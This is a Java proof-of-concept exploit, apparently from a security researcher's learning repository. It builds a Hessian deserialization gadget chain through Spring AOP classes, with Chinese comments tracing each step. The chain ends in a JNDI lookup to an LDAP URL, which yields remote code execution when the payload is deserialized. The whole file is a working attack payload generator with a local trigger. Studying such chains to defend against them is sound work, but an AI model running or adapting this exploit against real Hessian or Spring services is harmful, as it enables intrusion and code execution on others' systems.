package org.h3rmesk1t.Hessian;

import com.caucho.hessian.io.*;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectInstanceFactory;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import sun.reflect.ReflectionFactory;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/11 6:26 下午
 */
public class SpringPartiallyComparableAdvisorHolderGadget {

    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static <T> T createWithoutConstructor ( Class<T> classToInstantiate )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }

    @SuppressWarnings ( {
            "unchecked"
    } )
    public static <T> T createWithConstructor ( Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes,
                                                Object[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }

    public static void main(String[] args) throws Exception {

        String jndiUrl = "ldap://127.0.0.1:1389/fjkrsc";
        SimpleJndiBeanFactory beanFactory = new SimpleJndiBeanFactory();
        beanFactory.addShareableResource(jndiUrl);

        // 反序列化时 BeanFactoryAspectInstanceFactory.getOrder 会被调用, 会触发调用 SimpleJndiBeanFactory.getType -> SimpleJndiBeanFactory.doGetType -> SimpleJndiBeanFactory.doGetSingleton -> SimpleJndiBeanFactory.lookup -> JndiTemplate.lookup.
        setFieldValue(beanFactory, "logger", new NoOpLog());
        setFieldValue(beanFactory.getJndiTemplate(), "logger", new NoOpLog());

        // 反序列化时 AspectJAroundAdvice.getOrder 会被调用, 会触发 BeanFactoryAspectInstanceFactory.getOrder.
        AspectInstanceFactory aspectInstanceFactory = createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
        setFieldValue(aspectInstanceFactory, "beanFactory", beanFactory);
        setFieldValue(aspectInstanceFactory, "name", jndiUrl);

        // 反序列化时 AspectJPointcutAdvisor.getOrder 会被调用, 会触发 AspectJAroundAdvice.getOrder.
        AbstractAspectJAdvice advice = createWithoutConstructor(AspectJAroundAdvice.class);
        setFieldValue(advice, "aspectInstanceFactory", aspectInstanceFactory);

        // 反序列化时 PartiallyComparableAdvisorHolder.toString 会被调用, 会触发 AspectJPointcutAdvisor.getOrder.
        AspectJPointcutAdvisor advisor = createWithoutConstructor(AspectJPointcutAdvisor.class);
        setFieldValue(advisor, "advice", advice);

        // 反序列化时 Xstring.equals 会被调用, 会触发 PartiallyComparableAdvisorHolder.toString.
        Class<?> pcahCl = Class.forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
        Object pcah = createWithoutConstructor(pcahCl);
        setFieldValue(pcah, "advisor", advisor);

        // 反序列化时 HotSwappableTargetSource.equals 会被调用, 触发 Xstring.equals.
        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(pcah);
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString("h3rmesk1t"));

        HashMap<Object, Object> hashMap = new HashMap<>();
        setFieldValue(hashMap, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, hotSwappableTargetSource1, hotSwappableTargetSource1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, hotSwappableTargetSource2, hotSwappableTargetSource2, null));
        setFieldValue(hashMap, "table", tbl);

        // Hessian 序列化数据
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
        AllowNonSerializableFactory serializableFactory = new AllowNonSerializableFactory();
        serializableFactory.setAllowNonSerializable(true);
        hessianOutput.setSerializerFactory(serializableFactory);
        hessianOutput.writeObject(hashMap);
        byte[] serializedData = byteArrayOutputStream.toByteArray();
        System.out.println("Hessian 序列化数据为: " + new String(serializedData, 0, serializedData.length));

        // Hessian 反序列化数据
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializedData);
        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
        hessianInput.readObject();
    }
}
